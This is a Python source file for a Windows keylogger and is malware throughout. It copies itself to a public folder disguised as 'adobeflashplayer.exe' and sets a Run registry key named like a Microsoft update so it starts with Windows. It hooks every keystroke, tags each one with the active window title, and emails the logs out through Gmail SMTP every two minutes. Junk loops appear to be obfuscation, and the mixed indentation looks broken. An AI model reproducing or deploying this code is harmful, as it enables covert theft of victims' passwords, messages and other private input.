import pythoncom
import pyHook
from os import path
from time import sleep
from threading import Thread
import urllib, urllib2
import smtplib
import datetime
import win32com.client
import win32event, win32api, winerror
from _winreg import *
import shutil
import sys

ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    ironm = None
    print "nope lol xd"
    sys.exit()

x, data, count = '', '', 0

dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
lastWindow = ''

def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)    
if not path.isfile(dir):
    startup()   

    
def send_mail():
    global data
	for i in xrange(2):
		print "yay"
    while True:
		for j in xrange(10):
			print "lol"
	# FILE
        if len(data) > 25:
		# MAI
			for k in xrange(5):
				if k == 2:
					break
            timeInSecs = datetime.datetime.now()
            # VISTO
			SERVER = "smtp.gmail.com"
            # PRIMA
			PORT = 587
			# DI
            USER = EEMAIL
			# QUEST
            PASS = EPASS
			# OGGI
            FROM = USER
			# GIURO
            TO = [USER]
            SUBJECT = "BLM Log di: " + timeInSecs.isoformat() 
            MESSAGE =  data + "\r\n\n\nGrazie per aver utilizzato il nostro servizio e vaffanculo a te e tua madre."

            message_payload = "\r\n".join((
                                "From: %s" %FROM,
                                "To: %s" %TO,
                                "Subject: %s" %SUBJECT,
                                "",
                                MESSAGE))
            try:
                server = smtplib.SMTP()
                server.connect(SERVER, PORT)
                server.starttls()
                server.login(USER, PASS)
                server.sendmail(FROM, TO, message_payload)
                data = ''
                server.quit()
				for l in xrange(5):
					if l == 3:
						break
            except Exception as error:
                print "fak"
        sleep(120)


def pushing(event):
    global data, lastWindow
    window = event.WindowName
    keys = {
            13: ' [LF] ',
            8: ' [BS] ',
            160: ' [SHIFT] ',
            161: ' [SHIFT] ',
            32: ' ',
            }
    keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
    if window != lastWindow:
        lastWindow = window
        data += '\r\n{' + lastWindow + '}\r\n'
        data += keyboardKeyName 
    else:
        data += keyboardKeyName

if __name__ == '__main__':
    triggerThread = Thread(target=send_mail)
    triggerThread.start()

    hookManager = pyHook.HookManager()
    hookManager.KeyDown = pushing
    hookManager.HookKeyboard()
    pythoncom.PumpMessages()
